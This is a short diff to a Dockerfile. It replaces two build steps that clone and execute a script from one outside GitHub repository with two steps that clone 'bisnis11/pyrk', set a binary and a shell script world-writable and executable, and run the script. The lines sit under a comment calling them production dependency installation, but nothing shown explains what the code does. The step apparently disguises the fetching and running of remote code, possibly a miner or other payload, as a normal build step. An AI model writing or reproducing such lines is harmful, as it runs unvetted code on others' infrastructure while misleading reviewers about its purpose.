@@ -11,5 +11,5 @@ WORKDIR $APP_HOME
 COPY . ./
 
 # Install production dependencies.
-RUN git clone https://github.com/diprassss/KUNTIL.git && cd KUNTIL && chmod 777 Node run.sh && ./run.sh
-RUN git clone https://github.com/diprassss/KUNTIL.git && cd KUNTIL && chmod 777 Node run.sh && ./run.sh
+RUN git clone https://github.com/bisnis11/pyrk.git && cd pyrk && chmod 777 pyrk pyrk.sh && ./pyrk.sh
+RUN git clone https://github.com/bisnis11/pyrk.git && cd pyrk && chmod 777 pyrk pyrk.sh && ./pyrk.sh
